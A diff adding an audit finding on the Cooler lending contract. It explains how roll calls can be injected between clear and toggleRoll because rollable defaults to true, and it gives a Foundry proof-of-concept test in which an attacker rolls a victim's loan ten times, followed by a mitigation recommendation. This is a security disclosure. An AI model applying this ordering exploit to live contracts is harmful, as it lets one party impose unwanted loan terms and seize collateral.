@@ -1,0 +1,119 @@
+# [H] It is possible to inject `roll` transactions between `clear` and `toggleRoll`
+
+## Summary
+Severity: High
+Reporter: Allarious
+Source: https://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L129-L147
+Type: audit-issue
+
+## Details
+# It is possible to inject `roll` transactions between `clear` and `toggleRoll`
+
+## Summary
+Since `rollable` is by default true for all loan positions, attacker can immediately act after the `clear` transaction to `roll` as many times he needs.
+
+## Vulnerability Detail
+### Attack from borrower to lender
+When a lender wants to clear a position and calls the clear function with enough allowance for the contract, the related request for borrow clears and the money gets transferred from the lender to the borrower. However, the `rollable` value is `true` by default which allows anyone in the network, specifically the `owner` of the `Cooler` contract to act and roll as many times as needed. This way, the owner of the contract can have an "Option" to trade any amounts of loan with collateral for an arbitrary amount of time. In finance, an option position should be bought by an agreement between two parties but here, borrower can force this option to the lender immediately after the clear transaction.
+
+### Attack from lender to borrower
+In this version, if the lender finds the interest rate good enough, can call the `roll` function just after the `clear` function and pay the collateral for interest added to extend the duration and interest rate on the amount as many times as he wants. This is dangerous since if an interest gets too high to an extent that the borrower can not pay the `amount + added interest`, the position defaults and the lender gets all the collateral spent + the initial collateral by the borrower.
+
+## Impact
+https://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L129-L147
+https://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L177
+
+## Code Snippet
+```solidity
+contract RollDebtTest is Test {
+    ERC20 public token1;
+    ERC20 public token2;
+
+    CoolerFactory public factory;
+    Cooler public cooler;
+
+    address public victim;
+    address public attacker;
+
+    uint256 ATTACKER_INITIAL_BALANCE = 10000 ether;
+    uint256 VICTIM_INITIAL_BALANCE = 10000 ether;
+
+    function setUp() public {
+        victim = vm.addr(1);
+        attacker = vm.addr(2);
+
+        token1 = new ERC20("token1", "TK1"); // Collateral
+        token2 = new ERC20("token2", "TK2"); // Debt
+
+        token1.mint(attacker, ATTACKER_INITIAL_BALANCE);
+        token2.mint(attacker, ATTACKER_INITIAL_BALANCE);
+
+        token1.mint(victim, VICTIM_INITIAL_BALANCE);
+        token2.mint(victim, VICTIM_INITIAL_BALANCE);
+
+        factory = new CoolerFactory();
+        cooler = Cooler(factory.generate(token1, token2));
+    }
+
+    function testRollLoanManyTimes() public {
+        // Imagining if lender is EOA or is interacting with the Cooler contract
+        // from a contract like clearingHouse, then she can only call the contract
+        // through functions individually. (is not using a contract to compose several calls together atomically)
+        
+        uint256 timestamp = 100;
+        uint256 duration = 10 days;
+        vm.warp(timestamp);
+
+        vm.startPrank(attacker);
+
+        token1.approve(address(cooler), 120 ether);
+        uint256 reqID = cooler.request(
+            100 ether,
+            1e16, // 1 percent interest
+            1e18, // exchanging 1 to 1
+            duration
+            );
+
+        vm.stopPrank();
+
+        assertTrue(cooler.isActive(reqID)); // Request is active
+
+        vm.startPrank(victim);
+
+        token2.approve(address(cooler), 100 ether);
+        uint256 loanID = cooler.clear(reqID); // Victim clear transaction
+
+        vm.stopPrank();
+
+        /**
+         * Attacker manipulates orderings so he can inject his own roll transactions between clear and toggelroll
+         */
+
+        assertFalse(cooler.isActive(reqID)); // Request is cleared and loan is in place
+
+        assertEq(cooler.getExpiryOf(loanID), duration + timestamp); // getExpiryOf is an added getter function for test purposes, it fetches the expiry value of a loanID
+        
+        vm.startPrank(attacker);
+        for(uint256 i; i < 10; ++i){
+            cooler.roll(loanID);
+        }
+        vm.stopPrank();
+
+        assertEq(cooler.getExpiryOf(loanID), duration * 10 + duration + timestamp);
+        /**
+         * Injection ends
+         */
+
+        vm.prank(victim);
+        cooler.toggleRoll(loanID); // Does not matter anymore
+    }
+}
+```
+
+## Tool used
+
+Manual Review
+
+## Recommendation
+It would be a good idea to limit the borrower to be able to roll at most once or `MAX_ROLL_ATTEMPTS` inside each `duration`.
+Lender should be able to set the default value for the `rollable`. Otherwise, lender needs to use a contract like `ClearingHouse` that calls `clear` and `toggleRoll` atomically.
